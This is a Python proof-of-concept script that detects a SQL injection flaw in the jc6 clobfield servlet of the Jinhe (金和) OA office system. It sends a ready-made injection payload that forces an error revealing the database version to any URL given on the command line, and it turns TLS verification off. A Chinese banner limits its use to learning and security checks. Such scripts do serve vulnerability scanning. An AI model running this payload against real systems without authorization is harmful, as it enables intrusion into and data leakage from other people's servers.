import requests
import argparse
import sys

def title():
    print("")
    print("")
    print('+------------------------------------------------------------+')
    print('金和OA jc6 clobfield SQL注入漏洞检测')
    print("仅限学习使用或安全排查使用，请勿用于非法测试！")
    print('使用方式: -u http://www.example.com')
    print('+------------------------------------------------------------+')
    print("")
def poc(url):
    headers= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data='''key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11%27%2F**%2Fand%2F**%2FCONVERT%28int%2C%40%40version%29%3D1%2F**%2Fand%2F**%2F%27%27%3D%27'''
    requests.packages.urllib3.disable_warnings()
    try:
        req=requests.post(url+"/jc6/servlet/clobfield",headers=headers,timeout=10,verify=False,data=data)
    except:
        print("请检查目标是否可访问，或不存在漏洞")
        sys.exit()
    try:
        text=req.text
        if("SQL" in text):
            print("-------------------" + "存在漏洞" + "----------------------------------+")
        else:
            print("-------------------" + "可惜了，不存在漏洞" + "------------------------+")
    except:
        print("-------------------" + "可惜了，不存在漏洞" + "------------------------+")
        sys.exit()


def arg():
    parser = argparse.ArgumentParser(description="Simple command line tool")
    parser.add_argument("-u", "--url", required=True, help="URL to target")
    args = parser.parse_args()
    url = args.url
    return url

if __name__ == '__main__':
    title()
    url=arg()
    poc(url)